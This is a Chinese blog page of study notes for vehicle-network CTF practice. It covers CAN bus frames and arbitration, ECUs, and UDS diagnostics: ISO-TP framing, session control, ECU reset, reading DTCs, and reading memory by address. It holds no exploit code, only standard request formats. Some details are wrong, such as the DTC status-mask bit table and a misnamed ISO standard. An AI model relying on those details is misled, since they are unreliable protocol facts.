@@ -1,0 +1,1375 @@
+<!DOCTYPE html><html lang="zh-Hans"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>车联网ctf | 沉于思，录以隙</title><meta name="description" content="# CAN总线通信 ## 为什么选can通信而不是以太网 在汽车领域，CAN（含CAN-FD）之所以能在绝大多数“车内控制域”里长期压倒以太网，除了低延迟外，还有 7 个与整车电子电气架构、可靠性、成本、生态强耦合的优势。下面按权重从高到低逐一拆解，并给出与车载以太网的直接对比。"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Zhi+Mang+Xing&family=Noto+Serif+SC:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><script>
+      (() => {
+        try {
+          const saved = localStorage.getItem("theme");
+          const theme = saved === "dark" || saved === "light"
+            ? saved
+            : (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+          document.documentElement.setAttribute("data-theme", theme);
+        } catch {
+          document.documentElement.setAttribute("data-theme", "light");
+        }
+      })();
+    </script><link rel="stylesheet" href="/_astro/_folder_.6ncck4XA.css"></head> <body class="is-post-page"> <header class="topbar topbar-post"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <a href="/#archive-search">搜索</a> <button id="theme-toggle" type="button" aria-label="切换主题"> <span class="theme-icon theme-sun">☀</span> <span class="theme-icon theme-moon">☾</span> </button> </nav> </header> <main id="main-content" class="page-shell page-main is-post-main">  <section class="post-cover-hero" style="background-image: url('/hero-bg.jpg')"> <div class="post-cover-hero__overlay"></div> <div class="post-cover-hero__inner"> <p class="post-cover-hero__eyebrow">车联网</p> <h1 class="post-cover-hero__title">车联网ctf</h1> </div> </section> <div class="article-shell" id="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <div class="article-layout"> <article class="article-panel"> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/车联网/" class="directory-link">车联网</a>   </div> <div class="article-meta-row"> <span>2025/12/12</span> <span>车联网</span>  </div> <div class="tag-row article-header__tags">  </div> <p class="source-note">来源路径：车联网/车联网ctf.md</p> </header> <div class="article-main"> <div class="article-content"><h1>CAN总线通信</h1><h2 id="section-1">为什么选can通信而不是以太网</h2><p>在汽车领域，CAN（含CAN-FD）之所以能在绝大多数“车内控制域”里长期压倒以太网，除了低延迟外，还有 7 个与整车电子电气架构、可靠性、成本、生态强耦合的优势。下面按权重从高到低逐一拆解，并给出与车载以太网的直接对比。</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>CAN / CAN-FD 的“护城河”</th>
+<th>车载以太网的短板</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 低延迟 &amp; 确定性</td>
+<td>• 位仲裁 → 无碰撞重传，高优先级报文延迟 &lt; 0.1 ms（@ 500 kbps，10 节点）   • 抖动可预测，方便做 1 ms 级闭环控制</td>
+<td>• 100BASE-T1 单跳 100 µs 级，但交换机缓存 + TSN 门控使最坏抖动 &gt; 1 ms   • 千兆虽带宽高，却需排队/整形，控制回路仍选 CAN</td>
+</tr>
+<tr>
+<td>2 物理鲁棒性</td>
+<td>• 单线/双线容错（ISO 11898-2）   • −40 °C~125 °C 车规级收发器成熟   • 抗 4 kV EFT 脉冲、±100 V 抛负载</td>
+<td>• 100BASE-T1 虽也车规，但线缆必须双绞+屏蔽，弯曲半径大，对振动耐受差   • 对供电瞬变更敏感，需额外 TVS、共模扼流圈</td>
+</tr>
+<tr>
+<td>3 总线供电与拓扑</td>
+<td>• 两根无屏蔽铜线即可供电+通信（“总线供电”方案）   • 线性/树形拓扑，节点可随意串联、T 型分支，布线极简</td>
+<td>• 星形/点对点为主，每节点到交换机一根独立链路 → 线束重量、成本、空间激增   • 无法像 CAN 那样“一根线串 20 个传感器”</td>
+</tr>
+<tr>
+<td>4 MCU 生态 &amp; 成本</td>
+<td>• 8/16/32 位 MCU 100 % 带 CAN 控制器，单价 &lt; 0.5 USD   • 收发器 TJA1042/TJA1057 年出货量数亿颗，0.1 USD 级</td>
+<td>• 千兆/百兆 MAC 需 32 位起步，带 TCP/IP 协议栈 → MCU 成本 2 USD+；PHY 1 USD+；交换机更贵</td>
+</tr>
+<tr>
+<td>5 确定性 + 故障隔离</td>
+<td>• 位级仲裁 → 延迟可建模   • 错误帧、Bus-off 机制 → 故障节点自动隔离，不影响剩余网络</td>
+<td>• AVB/TSN 虽可 QoS，但需配置整形器、门控列表，OEM 标定工作量大   • 网络风暴/广播包可瞬间淹没交换机</td>
+</tr>
+<tr>
+<td>6 工具链 &amp; 人才</td>
+<td>• Vector CANoe、Peak、Kvaser、Intrepid 等工具链 30 年历史   • 供应商、Tier-1、维修技师人人会 CAN</td>
+<td>• SOME/IP、TSN、DoIP 诊断栈刚起步，培训、标定、测试工具链贵且稀缺</td>
+</tr>
+<tr>
+<td>7 低功耗 &amp; 唤醒</td>
+<td>• CAN 收发器支持 “Wake-on-CAN”：   总线空闲 1 µA，收到特定帧即可唤醒 ECU</td>
+<td>• 以太网 PHY 即使低功耗模式也要 10 mA，无法直接挂在常电电池上</td>
+</tr>
+<tr>
+<td>8 向后兼容</td>
+<td>• 1986 年诞生至今，协议稳定；同一总线可混跑 Classic CAN 与 CAN-FD</td>
+<td>• 100BASE-T1 ↔ 1000BASE-T1 互不兼容；升级到千兆需换 PHY + 线束</td>
+</tr>
+</tbody></table>
+<p>结论一句话：<br><strong>在车身、底盘、动力等“毫秒级闭环控制 + 高可靠 + 低成本 + 极简线束”场景，CAN/CAN-FD 的物理鲁棒性、拓扑灵活性、生态成本、确定性故障隔离形成了以太网短期内无法逾越的壁垒。</strong><br>车载以太网只在“高带宽域”（摄像头、激光雷达、OTA、信息娱乐）取代 MOST/LVDS，而不会全面替代 CAN。</p>
+<h2 id="section-2">结构</h2><p>采用了线状拓扑结构，其中所有设备都连接到一条共享的通信线（总线）上。以下是线状拓扑结构的一些优点：</p>
+<ol>
+<li><strong>成本效益</strong>：线状拓扑结构相对简单，所需的电缆长度较短，因此成本较低。</li>
+<li><strong>易于扩展</strong>：添加新的设备相对容易，只需将设备连接到总线上即可。</li>
+<li><strong>故障隔离</strong>：如果网络中的某个设备出现故障，通常不会影响其他设备的通信。</li>
+<li><strong>易于安装和维护</strong>：由于结构简单，安装和维护都比较容易。</li>
+<li><strong>适用于小型网络</strong>：对于小型网络，线状拓扑结构是一个很好的选择，因为它提供了足够的性能和可靠性。</li>
+</ol>
+<p>然而，线状拓扑结构也有一些缺点，如单点故障（如果总线本身出现故障，整个网络可能会受到影响）和潜在的通信冲突（当多个设备同时尝试发送数据时）。因此，在选择网络拓扑结构时，需要根据具体需求和网络环境来权衡其优缺点。</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/58f448c2d91f1c5e339b6883f3a8179c_MD5.png" alt=""></p>
+<h2 id="section-3">寻址方式</h2><h3 id="section-4">点对点寻址</h3><h3 id="section-5">广播寻址</h3><h2 id="section-6">报文结构</h2><h3 id="section-7">数据帧</h3><p>数据帧和遥控帧有标准格式和扩展格式两种格式。标准格式有 11 个位的标识符（Identifier: 以下简称 ID）， 扩展格式有 29 个位的 ID。</p>
+<p>数据帧由7个段构成</p>
+<p>显性0隐形1</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/daa1b43487850379c5b44488f7125e8d_MD5.png" alt=""></p>
+<p>从sof开始到eof结尾标志着一帧can报文发送完毕</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/59a7bd0e421d555dc4806e58e3c5276a_MD5.png" alt=""></p>
+<h4>帧起始</h4><p>帧起始由1个显性位组成。总线空闲时，发送节点发送帧起始，其他接收节点同步于该帧起始位。</p>
+<p>图中帧起始的1表示此位大小为1bit，非赋予的值。</p>
+<p>总线上的电平有显性电平和隐性电平两种。</p>
+<p>总线上执行逻辑上“与”时，显性电平的逻辑值为“0”，隐性电平为“1”。&amp;是乘法有0为0 否则为1</p>
+<h4>仲裁段</h4><p>仲裁段用于写明需要发送到目的CAN节点的地址、确定发送的帧类型（当前发送的是数据帧还是遥控帧），并确定发送的帧格式是标准帧还是扩展帧。</p>
+<p>仲裁段在标准格式帧和扩展格式帧中有所不同。标准格式帧的仲裁段由11位标识符和远程发送请求位RTR组成，扩展格式帧的仲裁场由29位标识符和远程发送请求位RTR组成。</p>
+<h4>控制段</h4><p>控制段由6个位组成，包括数据长度代码(DLC)和两个将来作为扩展用的保留位，标准格式和扩展格式的构成有所不同。</p>
+<p>数据长度代码指示了数据段中的字节数量。数据长度代码为4个位，在控制段里被发送，数据帧长度允许的字节数为0、1、2、3、4、5、6、7、8，其他数值为非法的。</p>
+<p>保留位（r0、r1）必须全部以显性电平发送。但接收方可以接收显性、隐性及其任意组合的电平。</p>
+<h4>数据段</h4><p>数据段由数据帧中的发送数据组成，它可以为0~8字节，每字节包含了8位，首先发送最高有效位MSB，依次发送至最低有效位LSB</p>
+<h4>CRC段</h4><p>crc段是检查帧传输错误的帧，包括：15 个位的 CRC序列（CRC SEQUENCE）和1 个位的CRC界定符（CRC DELIMITER）构成。</p>
+<p>CRC序列是根据多项式生成的 CRC 值，CRC 的计算范围包括：帧起始、仲裁段、控制段、数据 段。 接收方以同样的算法计算 CRC 值并进行比较，不一致时会通报错误。</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/c3dc66a70c362191d7595a4991dfb171_MD5.png" alt=""></p>
+<h4>ACK段</h4><p>ACK段用来确认是否正常接收。由 ACK 槽（ACK SLOT）和 ACK 界定符（ACK DELIMITER）2 个位构成。</p>
+<p>发送单元在 ACK 段发送 2 个位的隐性位。当接收器正确地接收到有效的报文时，接收器就会在应答间隙（ACK SLOT）期间（发送ACK 信号）向发送器发送一个“显性”的位以示应答，通知发送单元正常接收结束，这称作“发送 ACK”或者“返回 ACK”。</p>
+<p>发送 ACK/返回 ACK是在既不处于总线关闭态也不处于休眠态的所有接收单元中，接收到正常消息的单元 （发送单元不发送 ACK）。所谓正常消息是指不含填充错误、格式错误、CRC 错误的消息。</p>
+<h4>帧结束</h4><p>帧结束是由每一个数据帧和远程帧的标志序列界定的，这个标志序列由7个“隐性”位组成。</p>
+<h4>竞争总线机制(仲裁段)</h4><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/14805980a8dc977b495e2866baf70e67_MD5.png" alt=""></p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/5225dc609f99ba30cae8b5e06daf292e_MD5.png" alt=""></p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/668f829d2033895d6631e143bf09f6fb_MD5.png" alt=""></p>
+<p><strong>仲裁发生在帧的起始阶段（仲裁字段）</strong></p>
+<ul>
+<li>包含 ID 字段（决定优先级）</li>
+</ul>
+<p><strong>ID 越小，优先级越高</strong>（0 是显性位，1 是隐性位）</p>
+<p><strong>所有节点边发送边监听</strong></p>
+<ul>
+<li>如果发现自己发的是隐性位，但总线上是显性位 → 立即停止发送</li>
+</ul>
+<p><strong>举例：</strong></p>
+<ul>
+<li>A 发 ID = 0x100（二进制：0001 0000 0000）</li>
+<li>B 发 ID = 0x080（二进制：0000 1000 0000）</li>
+<li>比较前几位，B 的 ID 更小（优先级高）</li>
+<li>A 在仲裁段输掉，停止发送，B 赢得总线控制权</li>
+</ul>
+<h3 id="section-8">其他</h3><ul>
+<li>遥控帧 </li>
+<li>错误帧 </li>
+<li>过载帧 </li>
+<li>帧间隔</li>
+</ul>
+<h1>ECU</h1><p>是一个超小型计算机集成了供电系统，单片机，驱动系统</p>
+<p>在汽车 CAN 总线系统中，ECU 可以是发动机控制单元、安全气囊、音频系统等。一辆现代汽车可能有多达 100多 个 ECU - 每个 EC U 都可能具有需要与网络的其他部分共享的信息</p>
+<p>Electronic Control Unit，即电子控制单元，也可以叫 “行车电脑”。决定整车性能的最重要的部分就是它的ECU。</p>
+<p>作为现代汽车电子的核心元件之一 ，ECU电子控制单元在汽车中也许有好几个，每个管理不同的功能；而每个ECU系统之间又有信息交换。虽然在整车上的控制系统越来越复杂，但它仍然必须具备最基本的结构—微处理器（CPU）、存储器（ROM、RAM）、输入/输出接口(I/O)、模数转换器(A/D)以及整形、驱动等大规模集成电路。</p>
+<p>ECU控制发动机运行外，保护发动机和汽车安全的功能，当发动机转速或汽车行驶速度超过限定值时，ECU会切断发动机燃油供给，以保护车辆安全。而且随着轿车电子化自动化的提高，ECU的控制范围已经扩张到巡航控制、灯光控制 、安全气囊控制，悬架控制 、燃油加热控制、排气控制、制动控制、EGR和增压压力控制等</p>
+<p>从外观上也很好辨认—在发动机电子燃油喷射系统中有一个形似方盒子的控制元件，它就是ECU。元件周围有许多细密的插槽，用来连接众多的输入输出电路，它和其他电子控制元件一起组成了汽车的大脑神经中枢系统 ，随时监控着输入的各种数据(比如刹车、换档等)和汽车运行的各种状态 (加速、打滑、油耗等 )，并按照预先设计的程序计算各种传感器送来的信息，经过处理以后，把各个参数发送给各相关的执行机构 ，执行各种预定的控制功能。</p>
+<h1>车架构</h1><p><a href="https://zhuanlan.zhihu.com/p/6774661785">zcu</a></p>
+<h1><strong>UDS 协议</strong></h1><h2 id="section-9">是什么</h2><p>是一种与控制单元通信的方式</p>
+<p>输入解决方案：标准化协议。这种诊断通信协议被称为统一诊断服务 (UDS) ，可协调全球汽车电子领域的ECU诊断。</p>
+<p>体验 UDS 的无缝衔接，因为它弥合了制造商之间的差距，并开创了汽车诊断的新时代。</p>
+<p>“统一”一词意味着它是一个通用标准，而不是特定的公司标准，因此所有ECU制造商 (OEM) 的服务和功能都是相同的。“诊断”一词意味着它是一种识别车辆任何类型疾病 (故障) 的技术。它还允许我们重新编程和校准传感器。</p>
+<p>‍‍测试仪与ECU通信，每辆车都有OBD (车载诊断) 接口端口。借助OBD接口电缆，我们可以与汽车连接，并且可以读取故障代码或重新编程或校准传感器。</p>
+<h2 id="section-10">为什么用</h2><p>在当今的现代车辆中，有 100 多个微型控制单元可以处理不同的任务，例如管理电池、控制变速箱、处理制动，甚至照顾娱乐系统。但是当出现问题时，就像一个人生病一样。</p>
+<p>就像一个人去看医生找出问题并找到解决方案一样，车辆也需要弄清楚它的问题。它通过使用称为“故障代码”或“诊断故障代码 (DTC) ”的东西来实现此目的。此代码告诉我们车辆出了什么问题。</p>
+<p>为了帮助解决这个问题，有一种特殊的与控制单元通信的方式，称为统一诊断服务 (UDS) 协议。这就像车辆问控制单元，“嘿，发生了什么事？控制单元会给出一个答案，帮助我们理解问题。</p>
+<p>我们使用一种特殊的工具与控制单元进行通信。此工具连接到控制单元并获取故障代码。这有点像我们和车辆之间的翻译。这种通信可以使用不同的方式进行，例如通过 CAN、LIN 或 K 线方法。</p>
+<p>因此，就像人们需要与医生交谈以找出问题所在一样，车辆使用UDS协议和工具与他们的控制单元交谈，并在出现问题时找出发生了什么。</p>
+<p>通信协议指的是它用于在两个微控制器之间进行通信，或在控制器和计算机之间进行通信以传输数据。在汽车电子领域，我们有 ECU (电子控制单元) 。这些诊断协议用于识别ECU中的故障。</p>
+<h2 id="section-11"><strong>UDS帧格式</strong>和类别</h2><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/f9b662fd242255df4e89e1a5a887440e_MD5.png" alt=""></p>
+<pre><code class="language-plain">OBD2 消息字段说明
+● 标识符(canid) ： 对于 OBD2 消息，标识符为标准 11 位，用于区分“请求消息”（ID 7DF）和“响应消息”（ID 7E8 至 7E
+ F）。请注意，7E8 通常是主发动机或 ECU 的响应位置。
+● 长度(bytes) ：仅反映剩余数据（03 到 06）的长度（以字节数为单位）。对于车速示例，请求为 02（因为只有 01 和 0D 后跟
+），而响应为 03，因为 41、0D 和 32 都后跟。
+● 模式(mode) ： 对于请求，这将在 01-0A 之间。对于响应，0 将替换为 4（即 41、42、... 、4A）。SAE J1979 OBD10 标准中描
+述的 2 种模式。模式 1 显示当前数据，例如用于查看实时车速、RPM 等。其他模式用于显示或清除存储的诊断故障代码
+以及显示冻结帧数据。
+
+● PID ： 对于每种模式，都存在标准 OBD2 PID 列表 - 例如，在模式 01 中，PID 0D 是车速。有关完整列表，请查看我们
+的 OBD2 PID 概述 。每个 PID 都有一个描述，有些 PID 具有指定的最小值/最大值和转换公式。例如，速度的公式就是 A
+，这意味着 A 数据字节（以十六进制为单位）被转换为十进制以获得 km/h 转换值（即 32 变为 50 km/h以上）。例如，R
+ PM （PID 0C），公式为 （256*A + B） / 4。  ● A、B、C、D ： 这些是十六进制的数据字节，在用于 PID 公式计算之前
+，需要将其转换为十进制形式。请注意，不使用最后一个数据字节（在 Dh 之后）。
+</code></pre>
+<h3 id="section-12"><strong>请求帧格式：</strong></h3><p>请求帧格式如下所示。</p>
+<table>
+<thead>
+<tr>
+<th>PCI 长度</th>
+<th>SID</th>
+<th>子功能 ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="section-13"><strong>响应帧格式：</strong></h3><p>有两种类型的响应帧。这是一个积极的回应和一个消极的回应。</p>
+<p><strong>积极回应：</strong></p>
+<table>
+<thead>
+<tr>
+<th>PCI 长度</th>
+<th>SID+0x40</th>
+<th>子功能 ID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>否定回应：</strong></p>
+<table>
+<thead>
+<tr>
+<th>PCI 长度</th>
+<th>7F</th>
+<th>SID</th>
+<th>否定响应代码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/d968093a1d9fe0366136618aff1ee0be_MD5.png" alt=""></p>
+<h3 id="section-14">帧类别</h3><p>可看例子simulation vin</p>
+<p>对于不同的帧，通过 CAN 数据场的中的 PCI （Protocol control information）来进行区分。</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/f7388926aa0fdf77face317e4aec490c_MD5.png" alt=""></p>
+<p>以下是对 PCI 段的详细解释。</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/8f9e239305b420e26d1c72f7d4c0438a_MD5.png" alt=""></p>
+<h4>单帧sf</h4><p>对于帧的类型，通过需要发送的数据长度来确定。在正常寻址模式下，当数据长度小于等于 7 byte，则用单帧的形式发送。</p>
+<p>单帧的缩写为 SF，数据域的第一个字节高 4 bit 值为 0000，标识这是一个帧 SingleFrame，低 4bit 是SF_DL，即 DataLength，描述后面有几个字节有效的数据长度。后面没有使用的字节通常会用 0xAA 来进行填充。</p>
+<h4>多帧</h4><p>当数据长度大于 7 byte，数据需要分多帧才能发送完成，则需要使用到首帧、流控帧、连续帧。多帧的机制如下图所示。</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/c920e2e8759ee1d8ccaf242bb2ca5160_MD5.png" alt=""></p>
+<h5>首帧ff</h5><p>首先发送端会以一个 FirstFrame 开启通信，告诉接收端还有后续的内容要发，FirstFrame 使用前两个字节作为 PCI 信息，第一个字节高 4 bit 为 0001，(0x1)标识这是一个 FirstFrame，低 4 bit 加上第二个字节用于描述总共发送的数据长度是多少（包括在 FirstFrame 中和后续在 ConsecutiveFrame 中的所有数据）。</p>
+<p>该数据长度不包含 ConsecutiveFrame 的 PCI 部分。</p>
+<h5>流控帧fc</h5><p>接收端发送 FlowControl，告诉发送端能以什么样的速度和帧的数量来发送数据，</p>
+<p>第一字节的高 4 bit 为 0011，(0x30标识)<strong>低 4 bit 为 FS</strong>，即 FlowStatus，第二个字节为 BS（BlockSize），第三个字节为 STmin（SeperateTime）。</p>
+<p><strong>FS(FlowStatus)</strong></p>
+<p>流控帧有0，1，2 三种状态，分别命名为 ContinueToSend（CTS），Wait（WT），Overflow（OVFLW）。如果允许发送端继续发送 ConsecutiveFrame，则 FlowStatus=0；</p>
+<p>若要求发送端等一会再发送 连续帧，则 FlowStatus=1，允许发送端发送 连续帧时，接收端再发一个 FlowStatus=0 的 FlowControl。</p>
+<p>如果接收端因为资源问题无法接收发送端发送的数据，则发送一个 FlowStatus=2 的 FlowControl。</p>
+<p> <strong>BS（BlockSize）</strong></p>
+<p>BS 指示发送端一次可以发送多少个 ConsecutiveFrame，（设置为0时，发送数量无限制。）当发送 ConsecutiveFrame 数量达到 BS 时，需要接收端再次以一个 FlowControl 开启下一波的 ConsecutiveFrame 发送。</p>
+<p><strong>STmin（SeperateTime）</strong> </p>
+<p>接收端根据自身的接收和处理能力使用 STmin 指示发送端在发送 ConsecutiveFrame 时最小的时间间隔是多少，从而实现流控制。</p>
+<p>（BS 和 STmin 等于 0 时，表示接收端可以以最快的速度来接收数据，发送端可以一次发送的 ConsecutiveFrame 数量不受限制。）</p>
+<h5>连续帧cf</h5><p>ConsecutiveFrame 就是承载 FirstFrame 无法完全承载的剩余数据了，它使用第一个字节用作 PCI，高 4 bit 为 0010即(0x20)，低 4 bit 用于标识 ConsecutiveFrame 的序列号（SN），从 1 开始，每发送一次 ConsecutiveFrame 增加 1 。(0x21开始)</p>
+<h2 id="section-15">诊断服务</h2><p><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzU3OTI4NzY0OQ==&action=getalbum&album_id=2135829736873426944&scene=173&subscene=&sessionid=undefined&enterid=0&from_msgid=2247489103&from_itemidx=1&count=3&nolastread=1#wechat_redirect">#UDS</a></p>
+<h3 id="section-16">诊断会话是什么</h3><p>诊断会话是车辆ECU（电子控制单元）运行中的一种特定状态，用于控制诊断工具与ECU之间的通信行为。它决定了诊断工具可以访问哪些功能、执行哪些操作。</p>
+<p><strong>诊断会话</strong>是**UDS协议（ISO 14229）**中的核心概念之一，分为多种类型，不同的诊断会话对应不同的ECU功能和权限。</p>
+<h4><strong>诊断会话的类型</strong></h4><p>UDS协议中常见的诊断会话包括：</p>
+<h5><strong>1. 默认诊断会话（Default Session，0x10 0x01）</strong></h5><ul>
+<li>描述<ul>
+<li>ECU的默认状态，是车辆正常运行时的基本会话。</li>
+<li>功能受到限制，仅支持基本的诊断和监控操作。</li>
+</ul>
+</li>
+<li>限制<ul>
+<li>不允许执行安全访问（27服务）或刷写ECU（31、34服务）。</li>
+</ul>
+</li>
+</ul>
+<h5><strong>2. 编程会话（Programming Session，0x10 0x02）</strong></h5><ul>
+<li>描述<ul>
+<li>用于固件更新（刷写ECU）或编程操作。</li>
+<li>ECU进入该会话后，可能会关闭安全关键的子系统（如发动机控制）。</li>
+</ul>
+</li>
+<li>支持功能<ul>
+<li>安全访问（27服务）。</li>
+<li>下载固件（34服务）。</li>
+<li>刷写配置（31服务）。</li>
+</ul>
+</li>
+<li>限制<ul>
+<li>车辆必须静止，通常要求特别授权。</li>
+</ul>
+</li>
+</ul>
+<h5><strong>3. 扩展诊断会话（Extended Diagnostic Session，0x10 0x03）</strong></h5><ul>
+<li>描述<ul>
+<li>提供比默认会话更多的诊断功能。</li>
+<li>常用于维修和高级诊断任务。</li>
+</ul>
+</li>
+<li>支持功能<ul>
+<li>安全访问（27服务）。</li>
+<li>动态数据调整（2F服务）。</li>
+<li>特殊测试模式。</li>
+</ul>
+</li>
+<li>限制<ul>
+<li>有一定的安全性要求（如超时限制或授权）。</li>
+</ul>
+</li>
+</ul>
+<h3 id="section-17">10服务（<strong>诊断会话的切换</strong>）</h3><p>诊断会话切换使用<strong>10服务（Session Control）</strong>，诊断工具通过发送切换请求使ECU进入指定的会话。</p>
+<p><strong>请求格式</strong></p>
+<pre><code class="language-plain">复制代码
+10 xx
+</code></pre>
+<ul>
+<li><code>10</code>：服务ID，表示会话控制。</li>
+<li><code>xx</code>：子功能，指定目标会话：<ul>
+<li><code>0x01</code>：默认会话。</li>
+<li><code>0x02</code>：编程会话。</li>
+<li><code>0x03</code>：扩展诊断会话。</li>
+</ul>
+</li>
+</ul>
+<p>成功切换后，ECU返回：</p>
+<pre><code class="language-plain">50 xx
+</code></pre>
+<ul>
+<li><code>50</code>：会话控制的正响应。</li>
+<li><code>xx</code>：确认切换到的会话类型。</li>
+</ul>
+<h3 id="section-18">22服务（读取基础信息数据）</h3><p>22服务作为诊断服务中的基础服务，可以简单理解为就是一个用于读取ECU数据的外部接口，可实时获取软件内部的相关的状态信息。如vin码，ecu序列号，软件版本号、发动机状态等信息。等</p>
+<h3 id="section-19">11服务（ecu重启）</h3><p>根据<strong>ISO14119-1</strong>标准中所述，诊断服务11主要用于Client向Server(ECU)请求重启行为。</p>
+<p>该重启行为将会导致Server复位回归到特定的初始状态，具体是什么初始状态取决于Client的请求行为。</p>
+<table>
+<thead>
+<tr>
+<th>复位类型值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>01</code></td>
+<td>硬复位（Hard Reset）</td>
+</tr>
+<tr>
+<td><code>02</code></td>
+<td>关机（Key Off On Reset）</td>
+</tr>
+<tr>
+<td><code>03</code></td>
+<td>Soft Reset（软复位）</td>
+</tr>
+<tr>
+<td><code>04</code></td>
+<td>Enable Rapid Power Shutdown</td>
+</tr>
+</tbody></table>
+<p>电动汽车BMS电池管理系统</p>
+<ol>
+<li>硬复位（0x01）</li>
+</ol>
+<p><strong>ECU行为：</strong></p>
+<ul>
+<li>整个BMS系统<strong>断电重启</strong>（类似拔掉电池负极再装回）</li>
+<li><strong>清除所有RAM数据</strong>（如：电池SOC估算值、故障码、学习到的老化补偿）</li>
+<li><strong>重新初始化硬件</strong>（如：ADC采样电路、CAN控制器、高压接触器）</li>
+<li><strong>非易失性存储器（EEPROM）中的标定数据会重新加载</strong>（如：出厂电池容量参数）</li>
+</ul>
+<p><strong>结果：</strong><br>仪表盘的SOC显示可能会<strong>突变</strong>（比如从78%突然跳到80%，因为BMS重新用出厂参数重新估算）。</p>
+<ol start="2">
+<li>软复位（0x03）</li>
+</ol>
+<p><strong>ECU行为：</strong></p>
+<ul>
+<li><strong>仅重启软件</strong>（类似电脑按Ctrl+Alt+Del重启程序）</li>
+<li><strong>RAM中的数据保留</strong>（如：电池SOC的当前估算值、故障码、临时标定值）</li>
+<li><strong>不重新初始化硬件</strong>（高压接触器保持闭合，ADC采样不中断）</li>
+</ul>
+<p><strong>结果：</strong><br>SOC显示<strong>无跳变</strong>（比如从78.5%继续平滑更新），故障灯可能熄灭（如果之前的故障是软件假死）。</p>
+<p><strong>硬复位</strong>相当于<strong>重启整个电脑（断电开机）</strong>；</p>
+<p><strong>软复位</strong>相当于<strong>重启电脑上的某个程序（不关机）</strong></p>
+<h3 id="section-20">19服务(读取故障码信息）</h3><p>子功能</p>
+<table>
+<thead>
+<tr>
+<th>子功能码</th>
+<th>含义（读取什么）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>01</code></td>
+<td>报告所有已存储的 DTC</td>
+</tr>
+<tr>
+<td><code>02</code></td>
+<td>报告当前活动的 DTC</td>
+</tr>
+<tr>
+<td><code>04</code></td>
+<td>报告快照数据（DTC Snapshot）</td>
+</tr>
+<tr>
+<td><code>06</code></td>
+<td>报告 DTC 数量（有多少个故障）</td>
+</tr>
+<tr>
+<td><code>0A</code></td>
+<td>报告 DTC 状态掩码（某类 DTC 的状态）</td>
+</tr>
+<tr>
+<td><code>0F</code></td>
+<td>报告扩展数据记录（Extended Data Record）</td>
+</tr>
+</tbody></table>
+<p>02服务可用DTC 状态掩码：</p>
+<p>当你用 <code>0x19</code> 服务读取故障码时，车上的 ECU 可能存储了<strong>很多种状态的故障</strong>，比如：</p>
+<ul>
+<li>当前还在发生的故障</li>
+<li>已经发生但现在恢复的故障</li>
+<li>会触发故障灯（MIL）的故障</li>
+<li>挂起待验证的故障</li>
+</ul>
+<p>你不一定都想要，于是就用“状态掩码”来过滤。全要就是1902ff</p>
+<table>
+<thead>
+<tr>
+<th>Bit</th>
+<th>十六进制</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>7</td>
+<td><code>0x80</code></td>
+<td>故障测试未完成（自诊断条件未满足）</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>0x40</code></td>
+<td>故障测试失败（上次测试周期）</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>0x20</code></td>
+<td>故障当前未激活</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>0x10</code></td>
+<td>故障当前激活（Active）</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>0x08</code></td>
+<td>故障已确认（Confirmed DTC）</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>0x04</code></td>
+<td>故障导致 MIL 点亮（Check Engine）</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>0x02</code></td>
+<td>故障为挂起状态（Pending）</td>
+</tr>
+<tr>
+<td>0</td>
+<td><code>0x01</code></td>
+<td>历史故障（老故障 / 存储但未激活）</td>
+</tr>
+</tbody></table>
+<p>故障码格式</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/52145ce6e36e0f56f576d4ed1fdeb9ed_MD5.png" alt=""></p>
+<p><a href="https://www.cnblogs.com/cokefentas/p/17514220.html">DTC标准故障码格式</a></p>
+<p><a href="https://blog.csdn.net/qq_38301199/article/details/115177899">UDS（统一诊断服务）的理解——0x19服务_uds 19服务-CSDN博客</a></p>
+<h3 id="section-21">23服务(按地址读取内存)服务</h3><p>见secret in memory</p>
+<p><strong>请求格式</strong></p>
+<pre><code class="language-plain">23 14  [内存地址] [读取长度]
+</code></pre>
